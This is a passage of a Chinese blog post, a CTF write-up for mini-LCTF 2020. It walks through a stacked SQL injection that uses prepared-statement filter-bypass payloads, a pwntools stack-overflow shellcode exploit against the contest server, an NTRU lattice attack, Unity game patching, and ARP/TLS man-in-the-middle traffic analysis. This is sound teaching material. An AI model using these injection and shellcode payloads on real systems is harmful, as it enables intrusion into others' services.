@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="BC">
+
+
+
+
+
+<title>mini-LCTF WP BY CCCC-Team | BC&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">BC&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">BC&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">mini-LCTF WP BY CCCC-Team</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">BC</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 17, 2020&nbsp;&nbsp;12:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Sign-IN"><a href="#Sign-IN" class="headerlink" title="Sign IN"></a>Sign IN</h1><h3 id="1-Starting-Point"><a href="#1-Starting-Point" class="headerlink" title="1.Starting Point"></a>1.Starting Point</h3><p>没啥好说的，进xdsec网站查看源码就拿到flag了…  </p>
+<h1 id="WEb"><a href="#WEb" class="headerlink" title="WEb"></a>WEb</h1><h3 id="1-id-wife（堆叠注入"><a href="#1-id-wife（堆叠注入" class="headerlink" title="1.id_wife（堆叠注入)"></a>1.id_wife（堆叠注入)</h3><p>这个题怎么说，好像根据BUUCTF的那个随便注改的吧？之前我也写过那个题的wp.<br>但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名miniL，没跑出来表名,这个就是用二分法不断的尝试 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150#</span><br></pre></td></tr></table></figure>
+
+
+<p>后来想起来应该是堆叠注入，得到了俩表user和1145141919810，查看下内容</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `user`;</span><br><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `1145141919810`;</span><br></pre></td></tr></table></figure>
+
+<p>然后查看列在1145141919810中看到了content（flag也应该在这里） </p>
+<p>在mysql中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。<br>在sql中我们运用如下语句预编译：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">CONCAT</span>(<span class="string">&#x27;sele&#x27;</span>,<span class="string">&#x27;ct content from `1145141919810`&#x27;</span>);</span><br><span class="line"><span class="keyword">prepare</span> payload <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> payload;</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> payload;</span><br></pre></td></tr></table></figure>
+
+<p>做到最后后一个hint：strstr（）是提示我们大小写的，多试着改几次</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),4,1)))=105;<span class="keyword">SET</span> @<span class="keyword">SQL</span>=<span class="keyword">CONCAT</span>(<span class="string">&#x27;sele&#x27;</span>,<span class="string">&#x27;ct content From `1145141919810`&#x27;</span>); <span class="keyword">PREPARE</span> PAYLOAD <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> Payload;<span class="keyword">Deallocate</span> <span class="keyword">prePare</span> payload;<span class="keyword">Show</span> <span class="keyword">Columns</span> <span class="keyword">From</span> <span class="string">`1145141919810`</span> ;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>然后就可以拿到flag了（发现怎么还有个假的？？？emmmm）</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h4 id="1-hello"><a href="#1-hello" class="headerlink" title="1.hello"></a>1.hello</h4><p>这个题首先放gdb里看看保护</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-19.png" alt="image-20200517172402454"></p>
+<p>基本没开。</p>
+<p>放ida里反汇编一下</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-20.png" alt="image-20200517172543052"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-21.png" alt="image-20200517172505865"></p>
+<p>可以看到很明显的栈溢出，s只分配了48字节，但允许读入72字节。</p>
+<p>能利用的72-48=24字节，所以构造的rop链不能太长，需要利用另一个bd函数中的<code>jmp rsp</code>调回到栈上然后执行shellcode。</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-22.png" alt="image-20200517174831881"></p>
+<blockquote>
+<p> sp/esp/rsp（16bit/32bit/64bit）栈寄存器—指向栈顶</p>
+<p>bp/ebp/rbp 栈基址寄存器—指向栈底</p>
+<p>ip/eip/rip 程序指令寄存器—指向下一条待执行指令</p>
+</blockquote>
+<p>综上，此题是一个ret2shellcode的题。从网上找了一个原理图。</p>
+<p><strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。但是填充是从低地址向高地址方向。</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-23.png" alt="image-20200517194756892"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-24.png" alt="image-20200517180255401"></p>
+<p>就是先将shellcode压入栈，然后填充垃圾字符，然后放置返回地址，然后在被调用函数栈中压入新的汇编指令。</p>
+<p>当我们用常规的ret2text构造48字节字符串+ 8字节rbp+ 8字节bd函数地址(覆盖掉原返回地）</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-25.png" alt="image-20200517201320081"></p>
+<p>ret指令进入bd后弹出bd地址，rsp指向栈内储存的rbp的值</p>
+<p>bd函数将rbp再push入栈中, 此时rsp再加8，指向被新压入的rbp </p>
+<p>bd函数执行rsp上的指令</p>
+<p>在rsp所指向的位置 覆盖上shellcode,改变rsp的值使其指向getshelI的shellcode井再次进行跳转，完成getshell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh = process(&#x27;./hello&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.challenge.mini.lctf.online&#x27;</span>, <span class="number">10008</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;zsh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">jrsp = <span class="number">0x4006ca</span></span><br><span class="line">payload = flat(asm(shellcraft.sh()).ljust(<span class="number">0x30</span>+<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>),jrsp,asm(<span class="string">&#x27;sub rsp,64&#x27;</span>)+asm(<span class="string">&#x27;jmp rsp&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;What\&#x27;s your name?&#x27;</span>,payload)</span><br><span class="line">sh.interactive() </span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="1-ιIl"><a href="#1-ιIl" class="headerlink" title="1.ιIl"></a>1.ιIl</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">f=getPrime(<span class="number">511</span>)</span><br><span class="line">g=getPrime(<span class="number">511</span>)</span><br><span class="line"><span class="keyword">while</span> g&gt;pow(q/<span class="number">4</span>,<span class="number">0.5</span>) <span class="keyword">and</span> g&lt;pow(q/<span class="number">2</span>,<span class="number">0.5</span>):</span><br><span class="line">	g=getPrime(<span class="number">511</span>)</span><br><span class="line">f_inv_q=inverse(f,q)</span><br><span class="line">h=f_inv_q*g%q</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;flag&#x27;</span>)<span class="comment">#flag=flag.itself</span></span><br><span class="line">r=getPrime(<span class="number">510</span>)</span><br><span class="line">e=(r*h+m)%q</span><br><span class="line"><span class="keyword">print</span> q</span><br><span class="line"><span class="keyword">print</span> h</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
+<p>是关于非对称密码算法NTRUEncrypt的题目,由于知识水平有限，（只见过RSA的）<br>大脑对格相关的密码算法的了解一片空白，原理没太懂，但代码记下来了….<br>巅峰极客线上赛的一个wp：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7163#toc-2">https://xz.aliyun.com/t/7163#toc-2</a>  </p>
+<p>我记直接把代码放上吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#segemath</span></span><br><span class="line">p = <span class="number">126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727</span></span><br><span class="line">h = <span class="number">31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343</span></span><br><span class="line">c = <span class="number">81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct lattice.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve SVP.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line">print(f, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt.</span></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line">print(hex(m))</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-f-k-amp-base"><a href="#2-f-k-amp-base" class="headerlink" title="2.f**k&amp;base"></a>2.f**k&amp;base</h3><p>这个和上个题完全一样啊，我也不知道为什么出两道一样的题<br>现根据给出的q，f，g解出h，然后用上面代码即可。</p>
+<p><img src="/images/minil/%E6%A0%BC%E5%AF%86%E7%A0%812.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">q=<span class="number">172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799</span></span><br><span class="line">f=<span class="number">4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863</span></span><br><span class="line">g=<span class="number">5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397</span></span><br><span class="line">f_inv_q=inverse(f,q)</span><br><span class="line">h=f_inv_q*g%q</span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure>
+
+<p>然后就得到flag了….</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#segemath</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct lattice.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve SVP.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line">print(f, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt.</span></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line">print(hex(m))</span><br></pre></td></tr></table></figure>
+
+<p>最后记得转化为字符串再提交</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="1-MiniGameHacking"><a href="#1-MiniGameHacking" class="headerlink" title="1.MiniGameHacking"></a>1.MiniGameHacking</h3><p>这个游戏还比较有意思，题目不难，打开发现是是一个unity3d的游戏，破解很容易搜到教程，我就随便放一个<br>Unity游戏逆向及破解方法介绍 ：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-951398-1-1.html">https://www.52pojie.cn/thread-951398-1-1.html</a></p>
+<p>把assembly-csharp.dll拖出来，拉到dnspy中。去找相关的类（方法多种多样）<br>我想的就是找到Boss的伤害，然后删掉就行，类似于无敌版。<br>就找有关的Damage方法,把下面代码注释掉再进游戏即可，通关后拿到flag</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnDamaged</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.isDead)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.isDead = <span class="literal">true</span>;</span><br><span class="line">		Object obj = GameObject.FindGameObjectWithTag(<span class="string">&quot;Player&quot;</span>);</span><br><span class="line">		Camera.main.SendMessage(<span class="string">&quot;ShakeHandler&quot;</span>, <span class="number">10f</span>);</span><br><span class="line">		<span class="keyword">this</span>.shrinkEffect.SendMessage(<span class="string">&quot;PlayEffect&quot;</span>);</span><br><span class="line">		<span class="keyword">this</span>.audioSource.PlayOneShot(<span class="keyword">this</span>.deathSounds[Random.Range(<span class="number">0</span>, <span class="keyword">this</span>.deathSounds.Length)]);</span><br><span class="line">		<span class="keyword">this</span>.damuManager.SendMessage(<span class="string">&quot;RestartRound&quot;</span>);</span><br><span class="line">		<span class="keyword">this</span>.bossHealthManager.SendMessage(<span class="string">&quot;FullHealth&quot;</span>);</span><br><span class="line">		Object.Destroy(obj);</span><br><span class="line">		<span class="keyword">base</span>.Invoke(<span class="string">&quot;RespawnPlayer&quot;</span>, <span class="number">1f</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-MITM-0-队友"><a href="#2-MITM-0-队友" class="headerlink" title="2.MITM_0 (队友)"></a>2.MITM_0 (队友)</h3><p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-1.png" alt="image-20200517103850346"></p>
+<p>从题目中我们可以看到MITM，即中间人欺骗，里面提示HTTPS，也就是对应SSL,TLS中间人攻击。</p>
+<p>打开wireshark分析流量。</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-2.png" alt="image-20200517104447197"></p>
+<p>由于中间人攻击首先进行arp欺骗</p>
+<blockquote>
+<p><strong>ARP（Address Resolution Protocol）即地址解析协议，</strong> 用于实现从 IP 地址到 MAC 地址的映射，即询问目标IP对应的MAC地址。局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97">ARP欺骗</a>。</p>
+</blockquote>
+<p>我们过滤一下arp协议的包发现有两个vm，（tplink发出的广播里114的地址经wq师傅提示得知其实是干扰包），点进去看</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-3.png" alt="image-20200517104701550"></p>
+<p>记住这两个mac对应的ip地址。</p>
+<p>目前我们还确定不了谁是攻击者，因为我们不知道wireshark在哪里记录的流量,而且我感觉这里的数据包并不合理，不应该只有单向arp。</p>
+<p>紧接着就是对ssl协议与http协议进行过滤（因为有两种对抗https的中间人攻击，一个是伪造证书，一个是降https为http）</p>
+<p>发现http协议的包并不多，因此排除第二种攻击，锁定攻击者手法为第一种。</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-4.png" alt="image-20200517110028516"></p>
+<p>随便截取一段，发现ip存在192.168.1.152的数据包非常多，而且发现一个很有趣的现象，所有http包中都存在该地址</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-5.png" alt="image-20200517110341403"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-6.png" alt="image-20200517110353189"></p>
+<p>随便点进去一个</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-7.png" alt="image-20200517110824934"></p>
+<blockquote>
+<p> Ethernet II: 数据链路层以太网帧头部信息</p>
+<p> Internet Protocol Version 4: 互联网层IP包头部信息</p>
+</blockquote>
+<p>我们再回到之前的arp包中，仔细看一下info里是什么``192.168.1.1 is at 00:0c:29:3b:d3:41`，这时候就需要计算机网络协议的知识了。</p>
+<p>什么是arp,其实就是一个问谁有x.x.x.x这个地址告诉y.y.y.y，一个答x.x.x.x在z:z:z:z:z:z。</p>
+<p>我们现在考滤这样一个场景：x.x.x.x要向y.y.y.y的http服务发起访问，ip地址和端口都是很明确的所以ip头和tcp头构造没有问题，那如何获取Mac地址构造Eth头呢？整个流程是这样：x.x.x.x主机先看y.y.y.y是否是同子网ip，不同子网则查找本地MAC地址表中是否有网关ip对应的MAC地址，有则直接使用没有则对网关ip发起ARP；同子网则查找本地MAC地址表中是否有y.y.y.y对应的MAC地址，有则直接使用没有则对y.y.y.y发起ARP。ARP查看本地MAC地址表中是否有给定的ip对应的mac地址，有则向该MAC地址发送ARP查询包，没有则向ff:ff:ff:ff:ff:ff广播ARP查询包。</p>
+<p>在本例中则为谁有192.168.1.1告诉192.168.1.152，也就是152在之前应该就发送过arp，而下面tplink发送的广播询问的是谁有192.168.1.114告诉192.168.1.1，可以判断192.168.1.1为网关，而剩下的192.168.1.152则为攻击者。</p>
+<h3 id="3-MITM-1-队友"><a href="#3-MITM-1-队友" class="headerlink" title="3.MITM_1 (队友)"></a>3.MITM_1 (队友)</h3><p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-8.png" alt="image-20200517115549709"></p>
+<p>这个common name我其实一开始是不知道啥意思的，傻乎乎的理解成了“通常的名字”，然后好一顿查百科，各种试，都不对。后来在与wq师傅交流，给了我一个Hint：CA,CN，证书，又是证书，那么ssl攻击石锤了，那CN是啥呢？</p>
+<p>随便点进去一个包含CA的ssl包</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-9.png" alt="image-20200517120111241"></p>
+<p>注意到有几项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id-at-commonName&#x3D;webssl.chinanetcenter.com,</span><br><span class="line"></span><br><span class="line">id-at-organizationalUnitName&#x3D;IT,</span><br><span class="line"></span><br><span class="line">id-at-organizationName&#x3D;\347\275\221\345\256\277\347\247\221\346,</span><br><span class="line"></span><br><span class="line">id-at-localityName&#x3D;\345\216\246\35</span><br></pre></td></tr></table></figure>
+
+<p>第一项就是我们要找的common name 啦，</p>
+<blockquote>
+<p>简称：CN 字段，对于 SSL 证书，一般为网站域名；而对于代码签名证书则为申请单位名称；而对于客户端证书则为证书申请者的姓名；</p>
+</blockquote>
+<p>但是！注意，fake issuer也是题目的要求，而不是一个无意义的词哦。</p>
+<p>下面学习TLS证书格式。</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-10.png" alt="image-20200517122333529"></p>
+<p>其中 <code>Certificate issuer</code> 是证书的签发者，issuer 字段的内容是一组符合 X.500 规范的DN（Distinguished Name）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issuer: C=US, ST=Arizona, L=Scottsdale, O=GoDaddy.com, Inc., OU=http://certs.godaddy.com/repository/, CN=Go Daddy Secure Certificate Authority - G2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-11.png" alt="image-20200517122510583"></p>
+<p>证书里的 <code>Subject&#39;s Name</code> 也是一组 DN，它表示证书的拥有者。</p>
+<p>我们继续筛选，地址包含攻击者，且协议为ssl的包，而且里面包含CA证书</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-12.png"></p>
+<p>ssl包中CA内有一个issuer字段，经过对比发现所有的ssl中都是它，那么提交一下，正确。</p>
+<h3 id="4-MITM-2-队友"><a href="#4-MITM-2-队友" class="headerlink" title="4.MITM_2 (队友)"></a>4.MITM_2 (队友)</h3><p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-13.png" alt="image-20200517123020637"></p>
+<p>题目中说，没有从受害者ip发送到攻击者ip的包。这很反直觉，按理说中间人攻击必须要有双方的流量才能攻击成功啊，那么是什么原因造成的呢？</p>
+<p>记得福尔摩斯对华生说：“当你排除一切不可能的情况，剩下的，不管多难以置信，那都是事实。”</p>
+<p>我们有理由相信，是记录流量的wireshark出了问题。</p>
+<p>那么是什么问题呢？</p>
+<p>还是感谢wq学长的提示，wireshark记录ip并没有对比其中的mac地址，这就造成了它记录到的ip并不是真实的ip。</p>
+<p>在这里，受害者ip被解释成了攻击者ip，其中标号25和26的数据包中</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-14.png" alt="image-20200517125643280"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-15.png" alt="image-20200517125705409"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-16.png" alt="image-20200517125726382"></p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-17.png" alt="image-20200517125739961"></p>
+<p> 一个src ip是192.168.1.151一个dst ip是13.226.113.33，但是mac地址都是d3:41，这说明其实这时记录到的数据包是攻击者伪装ip的数据包，而wireshark并没有对此检验，对比最上面arp协议的包，发现192.168.1.1的mac地址也是d3:41，因此使用ip过滤规则会发现没有受害者向攻击者发送的数据包（如果有的话，就会造成成eth.scr==eth.dst），换一款用mac来标识ip的流量包观察工具就会报错。</p>
+<p>最后，通过分析工具找到一个ip和域名（与出题人有关所以要留意一点），这个是wireshark服务端所在地址。但貌似mac地址(d3:41)和攻击者的mac也是一样的，大概也被arp欺骗了吧？</p>
+<p><img src="https://image.hackerjerry.top/mini_l-ctf_wp-18.png" alt="image-20200517163738960"></p>
+<blockquote>
